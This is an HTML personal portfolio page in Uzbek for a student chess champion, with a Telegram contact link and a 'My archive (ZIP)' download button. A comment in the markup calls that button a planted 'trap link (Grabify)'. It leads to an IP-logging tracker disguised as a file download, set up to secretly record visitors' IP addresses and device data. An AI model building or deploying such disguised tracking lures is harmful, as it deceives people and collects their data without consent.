<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Abdilasizaliyev - Portfolio</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; 
        }
        .card { 
            background: white; padding: 40px; border-radius: 30px; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.2); max-width: 400px; width: 100%; text-align: center; 
        }
        .profile-img { 
            width: 140px; height: 140px; border-radius: 50%; margin: 0 auto 20px; 
            border: 5px solid #6c5ce7; object-fit: cover; display: block;
            box-shadow: 0 10px 20px rgba(108, 92, 231, 0.3); 
        }
        h1 { color: #2d3436; margin: 10px 0; font-size: 28px; }
        .subtitle { color: #636e72; font-size: 14px; margin-bottom: 25px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        .stats { display: flex; justify-content: space-around; margin: 25px 0; padding: 15px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; }
        .stat-item b { display: block; font-size: 20px; color: #6c5ce7; }
        .stat-item span { font-size: 12px; color: #b2bec3; }
        .description { line-height: 1.6; color: #444; font-size: 15px; margin-bottom: 30px; }
        .tg-btn { 
            display: block; padding: 15px; background: #0088cc; color: white; 
            text-decoration: none; border-radius: 15px; font-weight: bold; margin-bottom: 12px; transition: 0.3s; 
        }
        .main-btn { 
            display: block; padding: 15px; background: #6c5ce7; color: white; 
            text-decoration: none; border-radius: 15px; font-weight: bold; 
            box-shadow: 0 8px 15px rgba(108, 92, 231, 0.3); transition: 0.3s; 
        }
        .main-btn:hover, .tg-btn:hover { transform: translateY(-3px); opacity: 0.9; }
    </style>
</head>
<body>
    <div class="card">
        <!-- Rasmingiz linki to'g'irlandi -->
        <img src="https://ibb.co" alt="Abdilasizaliyev" class="profile-img">
        
        <h1>Abdilasizaliyev</h1>
        <div class="subtitle">Qo'qon universiteti talabasi</div>
        
        <div class="stats">
            <div class="stat-item"><b>4 yil</b> <span>Tajriba</span></div>
            <div class="stat-item"><b>3 karra</b> <span>Chempion</span></div>
            <div class="stat-item"><b>19 yosh</b> <span>Yoshim</span></div>
        </div>

        <p class="description">
            Assalomu alaykum! Men Qo'qon universiteti Andijon filiali 1-kurs talabasiman. 
            Shaxmat bo'yicha 4 yillik tajribaga ega 3 karra viloyat chempioniman.
        </p>
        
        <a href="https://t.me" target="_blank" class="tg-btn">Telegram orqali bog'lanish</a>
        
        <!-- Tuzoq linki (Grabify) joylandi -->
        <a href="https://grabify.link" class="main-btn">Mening arxivim (ZIP)</a>
    </div>
</body>
</html>
